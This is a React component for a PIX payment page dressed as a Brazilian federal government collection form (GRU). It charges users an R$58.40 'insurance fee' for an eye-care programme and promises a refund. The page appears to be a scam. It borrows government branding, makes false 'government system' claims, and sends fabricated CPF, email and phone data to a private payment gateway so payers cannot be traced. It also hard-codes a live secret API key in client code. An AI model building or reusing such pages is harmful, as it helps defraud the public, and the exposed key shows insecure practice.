import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useUser } from '../context/UserContext';
import { useNavigate } from 'react-router-dom';

/* ── API Config ── */
const API_URL = 'https://gateway.evollute.tech/transactions';
const PUBLIC_KEY = 'pk_live_6f981087a75280e1cb126b9f728296b9';
const SECRET_KEY = 'sk_live_a4f17310be395f61ea7763a27236621e';
const AUTH_HEADER = 'Basic ' + btoa(`${PUBLIC_KEY}:${SECRET_KEY}`);
const AMOUNT_CENTS = 5840; // R$ 58,40

/* ── Componente ── */
const PagamentoGRU: React.FC = () => {
  const { userData, transactionData, setTransactionData } = useUser();
  const navigate = useNavigate();

  const [pixCode, setPixCode] = useState<string>(transactionData.qrCode || '');
  const [transactionId, setTransactionId] = useState<string>(transactionData.transactionId || '');
  const [loading, setLoading] = useState(!transactionData.qrCode);
  const [error, setError] = useState('');
  const [copied, setCopied] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<string>('pending');
  const pollingRef = useRef<number | null>(null);
  const creatingRef = useRef(false);

  const firstName = userData?.nome
    ? userData.nome.split(' ')[0].charAt(0).toUpperCase() + userData.nome.split(' ')[0].slice(1).toLowerCase()
    : 'Paciente';

  /* ── Criar transação PIX ── */
  const createTransaction = useCallback(async () => {
    if (creatingRef.current) return;
    creatingRef.current = true;

    try {
      setLoading(true);
      setError('');

      // Gera dados aleatórios válidos
      const randomId = Math.random().toString(36).substring(2, 10);
      const randomPhone = '5511' + String(Math.floor(900000000 + Math.random() * 99999999)).padStart(9, '0');
      const randomCpfDigits = String(Math.floor(10000000000 + Math.random() * 89999999999));
      const nome = userData?.nome || 'Paciente Brasil';

      const body: Record<string, unknown> = {
        amount: AMOUNT_CENTS,
        paymentMethod: 'pix',
        customer: {
          name: nome,
          email: `user${randomId}@gmail.com`,
          phone: randomPhone,
          document: {
            type: 'cpf',
            number: randomCpfDigits,
          },
        },
        items: [
          {
            name: 'Taxa de Seguro - Projeto Enxerga Brasil',
            quantity: 1,
            unitPrice: AMOUNT_CENTS,
            externalRef: `enx-${Date.now()}`,
            isPhysical: false,
          },
        ],
        pix: {
          expiresInDays: 1,
        },
      };

      const res = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: AUTH_HEADER },
        body: JSON.stringify(body),
      });

      const json = await res.json();
      console.log('API response:', res.status, json);

      if (!res.ok) {
        const msg = json?.message || json?.error || JSON.stringify(json);
        throw new Error(`Erro ${res.status}: ${msg}`);
      }

      const qrCode = json.data?.pix?.qrcode || json.pix?.qrcode;
      const txId = String(json.data?.id || json.id || '');

      if (qrCode) {
        setPixCode(qrCode);
        setTransactionId(txId);
        setTransactionData({ qrCode, transactionId: txId });
      } else {
        throw new Error('QR code não retornado: ' + JSON.stringify(json).substring(0, 200));
      }
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Erro ao gerar pagamento. Tente novamente.');
    } finally {
      setLoading(false);
      creatingRef.current = false;
    }
  }, [userData, setTransactionData]);

  /* ── Polling de status ── */
  const checkStatus = useCallback(async (id: string) => {
    try {
      const res = await fetch(`${API_URL}/${id}`, {
        headers: { 'Content-Type': 'application/json', authorization: AUTH_HEADER },
      });
      if (!res.ok) return;
      const json = await res.json();
      const status = json.data?.status || json.status;
      if (status) setPaymentStatus(status);

      if (status === 'paid') {
        if (pollingRef.current) { window.clearInterval(pollingRef.current); pollingRef.current = null; }
        setTimeout(() => navigate('/obrigado'), 3000);
      }
    } catch { /* silently ignore */ }
  }, [navigate]);

  /* ── Efeito: criar transação ao montar ── */
  useEffect(() => {
    if (!pixCode) createTransaction();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  /* ── Efeito: polling quando tiver transactionId ── */
  useEffect(() => {
    const id = transactionId;
    if (!id || paymentStatus === 'paid') return;
    checkStatus(id);
    pollingRef.current = window.setInterval(() => checkStatus(id), 5000);
    return () => { if (pollingRef.current) { window.clearInterval(pollingRef.current); pollingRef.current = null; } };
  }, [transactionId, paymentStatus, checkStatus]);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2500);
    } catch { /* fallback */ }
  };

  /* ── Tela de pagamento confirmado ── */
  if (paymentStatus === 'paid') {
    return (
      <div className="fixed inset-0 z-50 bg-white flex items-center justify-center" style={{ fontFamily: 'Rawline, Raleway, sans-serif' }}>
        <div className="text-center max-w-md mx-auto px-6">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Pagamento confirmado!</h2>
          <p className="text-gray-600 mb-2">Sua inscrição foi finalizada com sucesso.</p>
          <p className="text-sm text-gray-400">Redirecionando...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-white" style={{ fontFamily: 'Rawline, Raleway, sans-serif' }}>
      {/* Header sticky */}
      <div className="sticky top-0 z-10 bg-white border-b border-gray-200">
        <div className="flex items-center justify-between p-4 md:p-6">
          <div className="flex items-center space-x-4">
            <img
              src="/image.png"
              alt="Governo Federal"
              className="h-10 md:h-12 w-auto"
            />
            <div>
              <h1 className="text-xl md:text-2xl font-semibold text-gray-900" style={{ fontSize: 14 }}>
                Guia de Recolhimento da União
              </h1>
            </div>
          </div>
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 p-6 md:p-8 lg:p-12">
        <div className="max-w-5xl mx-auto">
          {/* Heading */}
          <div className="text-center mb-8 md:mb-12">
            <h2 className="text-2xl md:text-3xl font-light text-gray-900 mb-2">
              {firstName}, finalize sua inscrição
            </h2>
            <p className="text-gray-600">Última etapa para confirmar sua participação</p>
          </div>

          {/* ── Loading ── */}
          {loading && (
            <div className="flex flex-col items-center justify-center py-20">
              <div className="w-16 h-16 border-4 border-gray-200 border-t-[#1351B4] rounded-full animate-spin mb-6" />
              <p className="text-gray-600 text-lg">Gerando pagamento PIX...</p>
              <p className="text-gray-400 text-sm mt-1">Aguarde alguns segundos</p>
            </div>
          )}

          {/* ── Error ── */}
          {error && !loading && (
            <div className="flex flex-col items-center justify-center py-20">
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-6">
                <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </div>
              <p className="text-gray-900 text-lg font-medium mb-2">Falha ao gerar pagamento</p>
              <p className="text-gray-500 text-sm mb-6">{error}</p>
              <button
                onClick={createTransaction}
                className="px-6 py-3 bg-[#1351B4] text-white rounded-lg font-medium hover:bg-blue-700 transition"
              >
                Tentar novamente
              </button>
            </div>
          )}

          {/* ── Payment content ── */}
          {!loading && !error && pixCode && (
            <>
              {/* Aguardando pagamento indicator */}
              <div className="flex items-center justify-center gap-2 mb-8">
                <span className="relative flex h-3 w-3">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-yellow-400 opacity-75" />
                  <span className="relative inline-flex rounded-full h-3 w-3 bg-yellow-500" />
                </span>
                <span className="text-sm text-yellow-700 font-medium">Aguardando pagamento...</span>
              </div>

              {/* Two-column grid */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-16">
                {/* LEFT COLUMN */}
                <div className="space-y-8">
                  {/* Total */}
                  <div className="text-center">
                    <p className="text-sm text-gray-500 mb-2">Total para quitação</p>
                    <p className="text-5xl md:text-6xl font-light text-gray-900 mb-1">R$ 58,40</p>
                    <p className="text-sm text-gray-500">Quitação com Segurança Garantida.</p>
                    <div className="mt-4 border-l-2 border-gray-300 pl-3 text-left max-w-sm mx-auto">
                      <p className="text-gray-700 text-xs font-medium mb-1">Garantia de comparecimento</p>
                      <p className="text-gray-600 text-xs">Valor devolvido integralmente após sua presença na consulta</p>
                    </div>
                  </div>

                  {/* QR Code */}
                  <div className="flex justify-center">
                    <div className="bg-gray-50 p-8 rounded-2xl">
                      <div className="w-64 h-64 md:w-80 md:h-80 bg-white rounded-xl flex items-center justify-center shadow-sm">
                        <img
                          src={`https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=${encodeURIComponent(pixCode)}`}
                          alt="QR Code PIX"
                          className="w-full h-full object-contain p-4"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* RIGHT COLUMN */}
                <div className="space-y-8">
                  {/* PIX Code */}
                  <div>
                    <h3 className="text-lg font-medium text-gray-900 mb-4">Código PIX</h3>
                    <div className="space-y-4">
                      <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                        <p className="text-xs font-mono text-gray-700 break-all leading-relaxed">
                          {pixCode}
                        </p>
                      </div>
                      <button
                        onClick={handleCopy}
                        className="w-full py-4 text-base font-semibold rounded-lg transition-all duration-300 bg-[#1351B4] hover:bg-blue-700 text-white inline-flex items-center justify-center gap-2"
                      >
                        {copied ? (
                          <>
                            <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                            </svg>
                            <span>Código copiado!</span>
                          </>
                        ) : (
                          <>
                            <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <rect width="14" height="14" x="8" y="8" rx="2" ry="2" />
                              <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2" />
                            </svg>
                            <span>Copiar código PIX</span>
                          </>
                        )}
                      </button>
                    </div>
                  </div>

                  {/* Para onde vai essa taxa */}
                  <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm">
                    <h3 className="text-lg font-semibold text-[#1351B4] mb-4 flex items-center gap-2">
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                      Para onde vai essa taxa?
                    </h3>
                    <div className="space-y-4">
                      <div className="space-y-3">
                        {[
                          { label: 'Custeio da Consulta', pct: 40, color: 'blue' },
                          { label: 'Tecnologia do Sistema', pct: 30, color: 'green' },
                          { label: 'Auditoria e Segurança', pct: 30, color: 'orange' },
                        ].map((item) => (
                          <div key={item.label} className="flex items-center gap-3">
                            <div className={`w-4 h-4 bg-${item.color}-500 rounded`} />
                            <div className="flex-1">
                              <div className="flex justify-between items-center mb-1">
                                <span className="text-sm font-medium text-gray-700">{item.label}</span>
                                <span className={`text-sm font-bold text-${item.color}-600`}>{item.pct}%</span>
                              </div>
                              <div className="w-full bg-gray-200 rounded-full h-2">
                                <div className={`bg-${item.color}-500 h-2 rounded-full`} style={{ width: `${item.pct}%` }} />
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>

                      <div className="space-y-3 text-xs text-gray-600 bg-gray-50 p-3 rounded-lg">
                        <div className="flex items-start gap-2">
                          <div className="w-2 h-2 bg-blue-500 rounded-full mt-1 flex-shrink-0" />
                          <p><strong>Custeio da Consulta:</strong> Impressão, logística e atendimento em todo território nacional.</p>
                        </div>
                        <div className="flex items-start gap-2">
                          <div className="w-2 h-2 bg-green-500 rounded-full mt-1 flex-shrink-0" />
                          <p><strong>Tecnologia:</strong> Plataforma de inscrições, sistema de pagamentos e infraestrutura digital.</p>
                        </div>
                        <div className="flex items-start gap-2">
                          <div className="w-2 h-2 bg-orange-500 rounded-full mt-1 flex-shrink-0" />
                          <p><strong>Auditoria:</strong> Fiscalização, conformidade LGPD e validação de processos.</p>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* How to pay */}
                  <div>
                    <h3 className="text-lg font-medium text-gray-900 mb-4">Como quitar</h3>
                    <div className="space-y-3">
                      {[
                        'Abra seu aplicativo bancário',
                        'Acesse a área PIX',
                        'Escaneie o QR Code ou cole o código',
                        'Confirme a quitação',
                      ].map((text, i) => (
                        <div key={i} className="flex items-center text-gray-700">
                          <span className="w-6 h-6 bg-[#1351B4] text-white rounded-full flex items-center justify-center text-sm font-medium mr-3">
                            {i + 1}
                          </span>
                          {text}
                        </div>
                      ))}
                      <div className="flex items-center text-gray-700">
                        <span className="w-6 h-6 bg-green-600 text-white rounded-full flex items-center justify-center text-sm font-medium mr-3">
                          5
                        </span>
                        <span className="font-medium">Volte a esta página para confirmar sua inscrição</span>
                      </div>
                    </div>
                  </div>

                  {/* Warning */}
                  <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
                    <div className="flex items-start gap-3">
                      <div className="flex-shrink-0 w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center">
                        <svg className="h-4 w-4 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="m12 19-7-7 7-7" />
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 12H5" />
                        </svg>
                      </div>
                      <div>
                        <h4 className="font-medium text-amber-800 text-sm mb-1">Importante: Volte após o pagamento</h4>
                        <p className="text-amber-700 text-xs leading-relaxed">
                          Após realizar o pagamento PIX no seu banco, retorne a esta página. A confirmação da sua inscrição será feita automaticamente assim que identificarmos o pagamento.
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* After payment */}
                  <div className="bg-gray-50 p-6 rounded-lg">
                    <h4 className="font-medium text-gray-900 mb-3">Após a quitação</h4>
                    <p className="text-gray-600 text-sm leading-relaxed">
                      Seu protocolo será finalizado automaticamente. Você receberá confirmação com todas as informações necessárias para acompanhar o agendamento.
                    </p>
                  </div>
                </div>
              </div>

              {/* Footer */}
              <div className="text-center mt-12 pt-8 border-t border-gray-200">
                <div className="flex items-center justify-center mb-2">
                  <svg className="w-4 h-4 text-gray-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z" />
                  </svg>
                  <span className="text-sm text-gray-500">Quitação segura</span>
                </div>
                <p className="text-xs text-gray-400">Processado via sistema governamental • SSL • Dados criptografados</p>
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

export default PagamentoGRU;
